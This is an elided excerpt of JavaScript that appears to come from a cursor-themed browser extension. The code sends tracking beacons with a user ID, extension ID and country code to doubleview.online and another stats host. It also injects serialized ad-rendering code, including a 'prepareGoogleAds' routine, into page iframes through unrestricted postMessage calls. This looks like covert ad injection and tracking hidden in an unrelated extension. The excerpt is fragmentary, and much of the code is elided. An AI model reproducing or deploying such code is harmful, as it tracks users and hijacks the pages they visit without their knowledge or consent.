...
if (!window.zMainObj.adRequests) {
	...
	window.zMainObj.adRequests = {
		...
		altStat: function (action, blockName, network, count = 1) {
			new Image().src =
				'https://doubleview.online/gant/ceiekmdcekohaonbmapmnnnkppbjlbkp_64b3b14ee7e29f46857a49a2/ceiekmdcekohaonbmapmnnnkppbjlbkp/' +
				action +
				'/' +
				blockName +
				'/' +
		...
		stat: function (action, blockName, network, count = 1) {
			...
			let statUrl =
				`https://${statDom}/s/c?a=${action}&u=64b3b14ee7e29f46857a49a2&e=ceiekmdcekohaonbmapmnnnkppbjlbkp&b=west_${blockName}&n=${network}_west&r=` +
				Math.random();
		...
		postRenderStat(args) {
			...
			const props = {
				...
				p: {
					c: 'UZ',
					u: '64b3b14ee7e29f46857a49a2',
					e: 'ceiekmdcekohaonbmapmnnnkppbjlbkp',
					ac: action,
					ab: moduleName
				}
			};
				...
				if (data.go_found && data.frame_id === frame.id) {
					...
					if (frame.contentWindow) {
						frame.contentWindow.postMessage(
							{
								'cursorWorker': 1,
								'cursors': `(()=>{${window.zMainObj.adRequests.prepareGoogleAds.toString()};prepareGoogleAds('${frame.id
					...
					try {
						...
						if (iframe.contentWindow) {
							iframe.contentWindow.postMessage(
								{
									'cursorWorker': 1,
									'cursors': `(()=>{${subFrameCode.toString()};subFrameCode('${frameID}', "${styles}", '${adCount}', "${bgColor}", ${additionalRenderFunction}, ${debug}, function(){${postStatCode}})})()`
								},
								'*'
							);
						}
...
if(!window.zMainObj.storage && window.self === window.top)
{
	window.zMainObj.storage = {
		'extRequest' : function(params,callback)
		{
			...
			window.top.postMessage({'cursorMsg':1,'cursorData':1,'options':params,'details':params,'handler':handler},'*');
		},
...
(() => {
	...
	let unid = '64b3b14ee7e29f46857a49a2';
